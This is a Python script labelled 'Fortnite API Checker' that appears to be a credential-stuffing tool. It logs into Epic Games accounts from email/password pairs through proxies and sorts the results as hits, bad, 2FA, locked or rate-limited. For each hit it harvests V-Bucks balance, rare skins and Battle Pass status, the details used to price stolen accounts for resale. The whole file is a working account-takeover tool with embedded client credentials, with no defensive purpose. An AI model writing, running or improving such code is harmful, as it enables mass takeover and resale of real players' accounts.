"""
╔══════════════════════════════════════════╗
║   FORTNITE API CHECKER                  ║
║          MADE BY - @NUTFRR              ║
╚══════════════════════════════════════════╝
Epic OAuth2 → Fortnite profile + V-Bucks + skins + Battle Pass
"""
import re
import base64
import requests

EPIC_CLIENT_LAUNCHER = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
EPIC_CLIENT_FORTNITE = "ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
EPIC_AUTH_URL        = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token"
EPIC_ACCT_URL        = "https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/"
FORTNITE_PROFILE_URL = "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile"
VBUCKS_CURRENCY      = "athena" # QueryProfile for athena gives currency

STATUS_HIT    = "HIT"
STATUS_BAD    = "BAD"
STATUS_2FA    = "2FA"
STATUS_LOCKED = "LOCKED"
STATUS_RATE   = "RATELIMIT"
STATUS_ERROR  = "ERROR"


def _session(proxy=None) -> requests.Session:
    s = requests.Session()
    s.timeout = 15
    if proxy:
        p = proxy if proxy.startswith("http") else f"http://{proxy}"
        s.proxies = {"http": p, "https": p}
    return s


def epic_login(email: str, password: str, proxy=None) -> dict:
    s = _session(proxy)
    try:
        r = s.post(EPIC_AUTH_URL, data={
            "grant_type":    "password",
            "username":      email,
            "password":      password,
            "includePerms":  "true",
        }, headers={
            "Authorization": f"basic {EPIC_CLIENT_LAUNCHER}",
            "Content-Type":  "application/x-www-form-urlencoded",
        })
        d = r.json()

        if "access_token" in d:
            return {"status": "ok", "access_token": d["access_token"],
                    "account_id": d.get("account_id", ""),
                    "display_name": d.get("displayName", "")}

        err = d.get("errorCode", "")
        if "invalid_credentials" in err or "authentication_failed" in err:
            return {"status": STATUS_BAD}
        if "two_factor" in err or "mfa" in err.lower():
            return {"status": STATUS_2FA}
        if "account_locked" in err or "disabled" in err:
            return {"status": STATUS_LOCKED}
        if r.status_code == 429:
            return {"status": STATUS_RATE}
        return {"status": STATUS_ERROR, "detail": err[:80]}

    except requests.exceptions.Timeout:
        return {"status": STATUS_RATE}
    except Exception as e:
        return {"status": STATUS_ERROR, "detail": str(e)[:80]}


def exchange_launcher_to_fortnite(launcher_token: str, proxy=None) -> str | None:
    """Exchange launcher access token for Fortnite client token."""
    s = _session(proxy)
    try:
        # Step 1: get exchange code
        r = s.get(
            "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange",
            headers={"Authorization": f"bearer {launcher_token}"}
        )
        code = r.json().get("code", "")
        if not code:
            return None

        # Step 2: exchange for Fortnite client token
        r2 = s.post(EPIC_AUTH_URL, data={
            "grant_type":    "exchange_code",
            "exchange_code": code,
            "includePerms":  "true",
            "token_type":    "egl",
        }, headers={
            "Authorization": f"basic {EPIC_CLIENT_FORTNITE}",
            "Content-Type":  "application/x-www-form-urlencoded",
        })
        return r2.json().get("access_token")
    except Exception:
        return None


def get_vbucks(fn_token: str, account_id: str, proxy=None) -> int:
    """Query Fortnite CommonCore profile for V-Bucks balance."""
    s = _session(proxy)
    try:
        r = s.post(
            f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile",
            params={"profileId": "common_core", "rvn": -1},
            json={},
            headers={
                "Authorization": f"bearer {fn_token}",
                "Content-Type":  "application/json",
            }
        )
        profile = r.json().get("profileChanges", [{}])[0].get("profile", {})
        items   = profile.get("items", {})
        for item in items.values():
            if item.get("templateId", "").startswith("Currency:MtxGiftbox") or \
               item.get("templateId", "") == "Currency:MtxPurchased":
                qty = item.get("attributes", {}).get("quantity", 0)
                if qty:
                    return qty
        # alt: check accountInfo
        for item in items.values():
            tid = item.get("templateId", "")
            if "Currency:Mtx" in tid:
                return item.get("attributes", {}).get("quantity", 0)
        return 0
    except Exception:
        return 0


def get_skins_count(fn_token: str, account_id: str, proxy=None) -> dict:
    """Count skins/emotes/pickaxes/gliders from athena profile."""
    s = _session(proxy)
    result = {"skins": 0, "emotes": 0, "pickaxes": 0, "gliders": 0,
              "total_items": 0, "rare_skins": []}
    try:
        r = s.post(
            f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile",
            params={"profileId": "athena", "rvn": -1},
            json={},
            headers={
                "Authorization": f"bearer {fn_token}",
                "Content-Type":  "application/json",
            }
        )
        items = r.json().get("profileChanges", [{}])[0].get("profile", {}).get("items", {})
        for item in items.values():
            tid = item.get("templateId", "")
            if tid.startswith("AthenaCharacter:"):
                result["skins"] += 1
                # mark OG / rare skins
                name = tid.replace("AthenaCharacter:", "").lower()
                if any(og in name for og in ["skull_trooper", "ghoul_trooper",
                                              "galaxy", "renegade_raider",
                                              "aerial_assault", "travis"]):
                    result["rare_skins"].append(name)
            elif tid.startswith("AthenaDance:"):
                result["emotes"] += 1
            elif tid.startswith("AthenaPickaxe:"):
                result["pickaxes"] += 1
            elif tid.startswith("AthenaGlider:"):
                result["gliders"] += 1
        result["total_items"] = len(items)
    except Exception:
        pass
    return result


def get_battle_pass(fn_token: str, account_id: str, proxy=None) -> dict:
    s = _session(proxy)
    try:
        r = s.post(
            f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile",
            params={"profileId": "campaign", "rvn": -1},
            json={},
            headers={
                "Authorization": f"bearer {fn_token}",
                "Content-Type":  "application/json",
            }
        )
        stats = r.json().get("profileChanges", [{}])[0].get("profile", {}).get("stats", {}).get("attributes", {})
        return {
            "battle_pass":       stats.get("book_purchased", False),
            "battle_pass_level": stats.get("book_level", 0),
            "season_level":      stats.get("level", 0),
            "past_seasons":      stats.get("past_seasons", []),
        }
    except Exception:
        return {"battle_pass": False, "battle_pass_level": 0, "season_level": 0, "past_seasons": []}


def check_fortnite(email: str, password: str, proxy=None) -> dict:
    base = {"email": email, "password": password, "checker": "fortnite"}

    # 1. Epic login
    login = epic_login(email, password, proxy)
    if login["status"] != "ok":
        return {**base, "status": login["status"]}

    launcher_token = login["access_token"]
    account_id     = login["account_id"]
    display_name   = login["display_name"]

    # 2. Exchange for Fortnite token
    fn_token = exchange_launcher_to_fortnite(launcher_token, proxy)
    if not fn_token:
        # still a valid Epic account, just can't get FN data
        return {
            **base,
            "status":       STATUS_HIT,
            "display_name": display_name,
            "account_id":   account_id,
            "vbucks":       0,
            "skins":        0,
            "emotes":       0,
            "pickaxes":     0,
            "gliders":      0,
            "total_items":  0,
            "rare_skins":   [],
            "battle_pass":  False,
            "bp_level":     0,
            "season_level": 0,
        }

    # 3. Gather all data
    vbucks    = get_vbucks(fn_token, account_id, proxy)
    cosmetics = get_skins_count(fn_token, account_id, proxy)
    bp        = get_battle_pass(fn_token, account_id, proxy)

    return {
        **base,
        "status":       STATUS_HIT,
        "display_name": display_name,
        "account_id":   account_id,
        "vbucks":       vbucks,
        "skins":        cosmetics["skins"],
        "emotes":       cosmetics["emotes"],
        "pickaxes":     cosmetics["pickaxes"],
        "gliders":      cosmetics["gliders"],
        "total_items":  cosmetics["total_items"],
        "rare_skins":   cosmetics["rare_skins"],
        "battle_pass":  bp["battle_pass"],
        "bp_level":     bp["battle_pass_level"],
        "season_level": bp["season_level"],
    }
